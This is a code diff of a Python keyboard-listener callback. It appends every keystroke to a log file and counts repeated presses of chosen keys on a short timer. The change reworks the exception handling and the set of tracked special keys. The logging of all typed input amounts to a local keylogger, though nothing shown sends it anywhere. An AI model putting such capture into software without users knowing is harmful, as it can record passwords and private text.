@@ -44,35 +44,38 @@ def on_press(key):
     idle_time = 30  # Reset idle time to 30 seconds on key press
     try:
         with open(log_path, 'a') as f:
-            f.write(f'{key}')
-            if key.char in desired_keys:
-                key_set.add(key.char)
-                key_count += 1
-    except AttributeError:
-        with open(log_path, 'a') as f:
-            if key == keyboard.Key.space:
-                f.write(' ')
-            elif key == keyboard.Key.enter:
-                f.write('\n')
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(key.char)
+                if key.char in desired_keys:
+                    key_set.add(key.char)
+                    key_count += 1
             else:
-                f.write(f'[{key}]')
-                if key == keyboard.Key.backslash:
-                    key_set.add('\\')
-                    key_count += 1
-                elif key == keyboard.Key.bracket_left:
-                    key_set.add('[')
-                    key_count += 1
-                elif key == keyboard.Key.grave:
-                    key_set.add('`')
-                    key_count += 1
+                if key == keyboard.Key.space:
+                    f.write(' ')
+                elif key == keyboard.Key.enter:
+                    f.write('\n')
+                else:
+                    f.write(f'[{key}]')
+                    if key == keyboard.Key.backspace:
+                        key_set.add('backspace')
+                        key_count += 1
+                    elif key == keyboard.Key.esc:
+                        key_set.add('esc')
+                        key_count += 1
+                    elif key == keyboard.Key.tab:
+                        key_set.add('tab')
+                        key_count += 1
+
+    except AttributeError:
+        pass
 
     # Start or reset the timer
     if key_timer is None:
-        key_timer = threading.Timer(2, reset_key_tracking)
+        key_timer = threading.Timer(1, reset_key_tracking)
         key_timer.start()
     else:
         key_timer.cancel()
-        key_timer = threading.Timer(2, reset_key_tracking)
+        key_timer = threading.Timer(1, reset_key_tracking)
         key_timer.start()
 
     # Check if the desired keys are pressed twice
